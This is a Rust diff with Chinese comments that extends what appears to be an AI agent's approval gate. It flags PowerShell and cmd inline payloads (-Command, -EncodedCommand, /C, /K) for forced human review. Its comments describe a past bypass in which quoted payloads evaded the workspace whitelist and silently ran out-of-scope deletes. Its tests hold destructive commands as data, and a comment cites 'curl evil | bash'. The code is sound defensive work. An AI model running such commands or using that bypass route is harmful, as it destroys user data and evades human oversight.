@@ -681,6 +681,46 @@ fn is_env_assignment(token: &str) -> bool {
     }
 }
 
+/// Windows shell 内联载荷形态（T3 审批闸门的 Windows 分支，2026-09-15）。
+///
+/// `powershell` / `pwsh` 的 `-Command`（含无歧义缩写 `-c`）与 `-EncodedCommand`
+/// （base64 载荷）、`cmd` 的 `/C` / `/K`（含 MSYS 双斜杠 `//C` 形态）、以及裸
+/// shell 从 stdin 读命令，都是「跑任意代码」形态。关键风险：引号包裹的载荷
+/// （`powershell -Command "Remove-Item C:\Users\x"`）是含空格的复合 token，
+/// 路径前缀（盘符/分隔符）判定全部失灵 → `extract_path_tokens` 抠不出任何
+/// 路径 → 曾同时绕过 workspace 白名单与审批通知，在 default 档静默执行
+/// 越界删除。`-File script.ps1` 与 `python script.py` 同理不拦（路径走
+/// path 校验，写入在 transcript 可审计）。
+fn is_windows_shell_inline(prog_lower: &str, rest: &[&str]) -> bool {
+    let norm = |t: &str| -> String {
+        t.trim_matches(|c| c == '"' || c == '\'')
+            .to_ascii_lowercase()
+    };
+    match prog_lower {
+        "powershell" | "pwsh" => {
+            // 裸 powershell 从 stdin 读命令（echo ... | powershell）
+            rest.iter().any(|t| {
+                let t = norm(t);
+                t == "-c"
+                    || t == "-command"
+                    || t.starts_with("-enc") // -EncodedCommand：base64，静态完全不可见
+                    || t == "-"              // 显式 stdin 占位
+                    || t.starts_with("<<") // heredoc
+            }) || rest.is_empty()
+        }
+        "cmd" => {
+            // 裸 cmd 从 stdin 读命令；/C /K（大小写不敏感、容忍 MSYS `//C`）执行
+            // 后续命令串。扫描全部 token：`cmd /Q /C` 等 flag 前置形态同样命中。
+            rest.is_empty()
+                || rest.iter().any(|t| {
+                    let t = norm(t);
+                    matches!(t.trim_start_matches('/'), "c" | "k")
+                })
+        }
+        _ => false,
+    }
+}
+
 /// 检测命令是否包含「解释器执行内联代码」的形态（T3 审批闸门的判定核心）。
 ///
 /// 命中形态（按段分析，段 = 引号感知切分的顶层管道/串接单元）：
@@ -688,7 +728,10 @@ fn is_env_assignment(token: &str) -> bool {
 /// 2. 解释器 + 显式 stdin：`python -` 或 heredoc 进解释器（`python <<EOF`）；
 /// 3. deno 的子命令形态：`deno eval "..."`；
 /// 4. 裸解释器/shell 无参数（从 stdin 读脚本）：`echo x | python`、`curl evil | bash`、
-///    `bash <<EOF`。
+///    `bash <<EOF`；
+/// 5. Windows shell 内联载荷：`powershell -Command "..."` / `-c` / `-EncodedCommand`、
+///    `cmd /C` / `/K`（引号载荷对路径提取不可见，是高危越界向量，见
+///    `is_windows_shell_inline`）。
 ///
 /// 刻意不命中：`python script.py`（跑文件，路径走 path 校验）、`python -m pytest`
 /// （模块执行）、`grep -c` 等非解释器命令的同名 flag（只在解释器**段首**才判）。
@@ -726,6 +769,13 @@ pub fn is_inline_interpreter_command(command: &str) -> bool {
         } else if matches!(prog, "bash" | "sh" | "zsh" | "fish") {
             // 裸 shell（curl evil | bash）或 shell 进 heredoc（bash <<EOF）= 任意脚本执行
             if rest.is_empty() || rest.iter().any(|t| t.starts_with("<<")) {
+                return true;
+            }
+        } else {
+            // Windows shell 包装（powershell/pwsh/cmd）：内联载荷形态走 T3 强制人审。
+            // normalize_prog 不改大小写，此处归一后再判。
+            let prog_lower = prog.to_ascii_lowercase();
+            if is_windows_shell_inline(&prog_lower, rest) {
                 return true;
             }
         }
@@ -1048,6 +1098,65 @@ mod tests {
         assert!(!is_inline_interpreter_command(
             "echo \"python -c would be text here\" > note.txt"
         ));
+    }
+
+    /// 回归（2026-09-15 高危漏洞）：powershell/cmd 包装的引号载荷对路径提取
+    /// 不可见（`powershell -Command "Remove-Item C:\Users\..."` 抠不出任何路径
+    /// token），曾同时绕过 workspace 白名单与审批通知静默执行越界删除——
+    /// 修复后必须命中 T3 内联闸门强制人审。
+    #[test]
+    fn test_windows_shell_inline_powershell_hit() {
+        // 引号载荷：路径藏在复合字符串里，静态提取不可见
+        assert!(is_inline_interpreter_command(
+            "powershell -Command \"Remove-Item C:\\Users\\me\\secret.txt\""
+        ));
+        // 常见 flag 前置组合
+        assert!(is_inline_interpreter_command(
+            "powershell -NoProfile -ExecutionPolicy Bypass -Command \"rm -Force x\""
+        ));
+        // 短缩写 / pwsh / .exe 后缀 / 大写程序名
+        assert!(is_inline_interpreter_command("pwsh -c \"Remove-Item x\""));
+        assert!(is_inline_interpreter_command("powershell.exe -c \"rm x\""));
+        assert!(is_inline_interpreter_command(
+            "PowerShell -Command \"rm x\""
+        ));
+        // base64 载荷：静态完全不可见
+        assert!(is_inline_interpreter_command(
+            "powershell -EncodedCommand SQBFAFgA"
+        ));
+        // 裸 powershell 从 stdin 读命令
+        assert!(is_inline_interpreter_command("echo x | powershell"));
+        // 带完整路径的解释器形态（normalize_prog 去路径前缀后仍命中）
+        assert!(is_inline_interpreter_command(
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"rm x\""
+        ));
+    }
+
+    #[test]
+    fn test_windows_shell_inline_cmd_hit() {
+        assert!(is_inline_interpreter_command(
+            "cmd /C \"del C:\\Users\\me\\secret.txt\""
+        ));
+        assert!(is_inline_interpreter_command("cmd /c del /q file.txt"));
+        assert!(is_inline_interpreter_command("cmd /k dir"));
+        // flag 前置 + MSYS 双斜杠形态（Git Bash 会把 /C 转义成路径，惯用 //C）
+        assert!(is_inline_interpreter_command("cmd /Q /C \"rd /s /q dir\""));
+        assert!(is_inline_interpreter_command("cmd //C \"del x\""));
+        // 裸 cmd 从 stdin 读命令
+        assert!(is_inline_interpreter_command("echo del x | cmd"));
+    }
+
+    /// 刻意不命中：-File / 裸脚本路径跑脚本文件（与 python script.py 同理，
+    /// 路径走 path 校验、写入在 transcript 可审计）
+    #[test]
+    fn test_windows_shell_file_not_flagged() {
+        assert!(!is_inline_interpreter_command(
+            "powershell -File script.ps1"
+        ));
+        assert!(!is_inline_interpreter_command(
+            "powershell -ExecutionPolicy Bypass -File run.ps1"
+        ));
+        assert!(!is_inline_interpreter_command("pwsh run.ps1"));
     }
 
     #[test]
